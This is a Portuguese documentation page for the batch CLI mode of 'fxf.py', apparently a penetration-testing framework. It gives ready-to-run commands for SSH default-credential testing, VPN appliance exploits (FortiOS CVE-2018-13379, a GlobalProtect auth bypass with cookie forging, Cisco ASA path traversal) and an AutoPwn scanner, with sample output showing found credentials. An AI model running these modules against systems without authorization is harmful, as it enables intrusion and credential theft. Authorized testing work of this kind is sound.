# CLI não-interativo (batch)

**Idioma:** Português (pt-BR). **English:** [../en-US/04-non-interactive-mode.md](../en-US/04-non-interactive-mode.md)

O modo não-interativo executa um único módulo com opções predefinidas sem iniciar o shell interativo. Útil para scripting, pipelines CI e automação.

---

## Sintaxe

```bash
python fxf.py -m <modulo/caminho> [-s "opcao valor"] [-s "opcao valor"] ...
python fxf.py --module <modulo/caminho> --set "opcao valor"
```

| Flag | Curta | Longa | Tipo | Obrigatório | Descrição |
|------|-------|-------|------|-------------|-----------|
| Módulo | `-m` | `--module` | `string` | sim | Caminho do módulo (barras ou pontos) |
| Definir opção | `-s` | `--set` | `string` | não (repetível) | `"nome_opcao valor"` — primeiro token é o nome da opção |
| Ajuda | `-h` | `--help` | flag | não | Exibe uso e encerra |

Fluxo de execução interno:
1. `use <modulo>` — carrega o módulo
2. Cada `-s "opcao valor"` → `set opcao valor`
3. `run` — executa

---

## Exemplos

### Teste de credenciais — SSH padrão

```bash
python fxf.py \
    -m creds/generic/ssh_default \
    -s "target 192.168.0.50" \
    -s "port 22" \
    -s "threads 4"
```

**Saída de exemplo:**
```
[*] Running module creds.generic.ssh_default...
[+] Found credentials: admin / admin
[+] Found credentials: root / root
```

### Exploit — FortiOS SSL-VPN path traversal (CVE-2018-13379)

```bash
python fxf.py \
    -m exploits/perimeter/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379 \
    -s "target 10.0.0.1" \
    -s "port 443" \
    -s "ssl true"
```

### Exploit — PAN-OS GlobalProtect auth bypass (CVE-2026-0257)

```bash
python fxf.py \
    -m exploits/perimeter/paloalto/globalprotect_auth_bypass_cve_2026_0257 \
    -s "target vpn.corp.exemplo.com.br" \
    -s "port 443" \
    -s "ssl true" \
    -s "forge_user admin" \
    -s "dump_session true"
```

**Saída de exemplo:**
```
[*] Stage 1 - Fingerprinting GlobalProtect em vpn.corp.exemplo.com.br:443...
[+] [CVE-2026-0257] Portal GlobalProtect detectado
[*] Stage 2 - Extraindo cadeia de certificados TLS...
[+] [CVE-2026-0257] Certificado extraído: subject='CN=vpn.corp.exemplo.com.br' key=RSAPublicKey
[*] Stage 3 - Forjando cookies de autenticação...
[+] [CVE-2026-0257] Cookie forjado: user='admin' os=Windows cookie=ng9ygxlaclyl...
[*] Stage 4 - Enviando cookies forjados aos endpoints GlobalProtect...
[+] [CVE-2026-0257] BYPASS CONFIRMADO via /ssl-vpn/prelogin.esp -- user='admin' os=Windows!
```

### AutoPwn — varredura automatizada de perímetro

```bash
python fxf.py \
    -m scanners/autopwn \
    -s "target 10.0.0.1" \
    -s "timing_template polite" \
    -s "target_device_class ngfw" \
    -s "check_exploits true" \
    -s "check_creds true"
```

### Instalar scripts NSE (não-interativo)

```bash
python fxf.py -c "install-nse"
python fxf.py -c "install-nse --force"
python fxf.py -c "install-nse --path /opt/homebrew/share/nmap/scripts"
```

---

## Ajuda

```bash
python fxf.py -h
# Saída: fxf.py -m <module> -s "<option> <value>"
```

---

## Pipelines e redirecionamento de saída

```bash
# Redirecionar stdout
python fxf.py -m creds/generic/ssh_default -s "target 10.0.0.1" 2>/dev/null | grep "Found"

# Anexar ao log
python fxf.py -m exploits/perimeter/cisco/asa_ftd_path_traversal_cve_2020_3452 \
    -s "target 10.0.0.1" >> auditoria.log 2>&1
```

A saída pode conter credenciais, banners ou tokens de sessão. Redirecione com cuidado.
Não há modo de saída JSON universal.

---

[Hub da wiki](../README.md)
